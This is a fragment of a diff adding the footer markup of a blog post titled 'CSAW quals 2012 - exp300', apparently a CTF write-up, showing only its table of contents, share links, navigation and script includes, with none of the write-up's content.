+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#First-Look"><span class="toc-number">1.</span> <span class="toc-text">First Look</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Environment-Setting"><span class="toc-number">2.</span> <span class="toc-text">Environment Setting</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Fork-based-environment"><span class="toc-number">2.1.</span> <span class="toc-text">Fork based environment</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dockerfile-creation"><span class="toc-number">2.2.</span> <span class="toc-text">dockerfile creation</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">3.</span> <span class="toc-text">Reverse</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PWN"><span class="toc-number">4.</span> <span class="toc-text">PWN</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/CSAW-quals-2012-exp300/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/CSAW-quals-2012-exp300/&text=CSAW quals 2012 - exp300"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/CSAW-quals-2012-exp300/&title=CSAW quals 2012 - exp300"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/CSAW-quals-2012-exp300/&is_video=false&description=CSAW quals 2012 - exp300"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=CSAW quals 2012 - exp300&body=Check out this article: http://yoursite.com/CSAW-quals-2012-exp300/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/CSAW-quals-2012-exp300/&title=CSAW quals 2012 - exp300"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/CSAW-quals-2012-exp300/&title=CSAW quals 2012 - exp300"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/CSAW-quals-2012-exp300/&title=CSAW quals 2012 - exp300"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/CSAW-quals-2012-exp300/&title=CSAW quals 2012 - exp300"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/CSAW-quals-2012-exp300/&name=CSAW quals 2012 - exp300&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 ShangKuei
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/fontawesome-all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Mermaid -->
+
+<script src='https://unpkg.com/mermaid@8.0.0-rc.8/dist/mermaid.min.js'></script>
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({theme: 'default'});
+  }
+</script>
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
